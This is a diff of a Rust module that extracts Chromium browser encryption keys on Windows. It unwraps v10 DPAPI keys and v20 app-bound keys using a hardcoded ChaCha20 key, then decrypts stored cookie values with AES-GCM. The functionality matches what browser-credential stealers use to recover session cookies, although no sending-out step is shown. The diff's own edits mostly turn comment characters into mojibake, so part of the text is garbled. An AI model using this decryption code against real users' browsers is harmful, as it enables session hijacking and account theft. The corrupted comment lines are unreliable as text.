@@ -1,9 +1,10 @@
+#![cfg(target_os = "windows")]
 //! Browser key extraction: v10 DPAPI keys and v20 app-bound keys.
 
 use super::browser_ffi::dpapi_unprotect;
 use super::base64_decode;
 
-// ── v10 DPAPI Key ─────────────────────────────────────────────────────────
+// 鈹€鈹€ v10 DPAPI Key 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 
 #[cfg(target_os = "windows")]
 pub(super) fn extract_v10_key(ls_path: &std::path::Path) -> Option<Vec<u8>> {
@@ -17,7 +18,7 @@ pub(super) fn extract_v10_key(ls_path: &std::path::Path) -> Option<Vec<u8>> {
     dpapi_unprotect(&raw[5..])
 }
 
-// ── v20 App-Bound Key ──────────────────────────────────────────────────────
+// 鈹€鈹€ v20 App-Bound Key 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 
 #[cfg(target_os = "windows")]
 pub(super) fn extract_v20_key(ls_path: &std::path::Path) -> Option<Vec<u8>> {
@@ -38,7 +39,7 @@ fn get_app_bound_master_key(base64: &str) -> Option<Vec<u8>> {
     parse_key_blob(&user_dec)
 }
 
-// ── Key Blob Parsing ───────────────────────────────────────────────────────
+// 鈹€鈹€ Key Blob Parsing 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 
 #[cfg(target_os = "windows")]
 fn parse_key_blob(blob: &[u8]) -> Option<Vec<u8>> {
@@ -86,7 +87,7 @@ const CHACHA20_KEY: &[u8] = &[
     0x09,0x0E,0x2D,0x1D,0x7E,0xEA,0x76,0x70,0xD4,0x1F,0x73,0x8D,0x08,0x72,0x96,0x60,
 ];
 
-// ── AES-GCM Decryption ────────────────────────────────────────────────────
+// 鈹€鈹€ AES-GCM Decryption 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 
 #[cfg(target_os = "windows")]
 pub(super) fn decrypt_aes_gcm(encrypted: &[u8], key: &[u8], is_cookie: bool) -> Option<String> {
@@ -107,7 +108,7 @@ pub(super) fn decrypt_aes_gcm(encrypted: &[u8], key: &[u8], is_cookie: bool) -> 
     let plaintext = cipher.decrypt(nonce, combined.as_slice()).ok()?;
 
     // v10 cookies have a 32-byte nonce prefix before the actual value
-    // v20 cookies do NOT have this prefix — the plaintext IS the value
+    // v20 cookies do NOT have this prefix 鈥?the plaintext IS the value
     if is_cookie && !is_v20 && plaintext.len() > 32 {
         Some(String::from_utf8_lossy(&plaintext[32..]).to_string())
     } else {
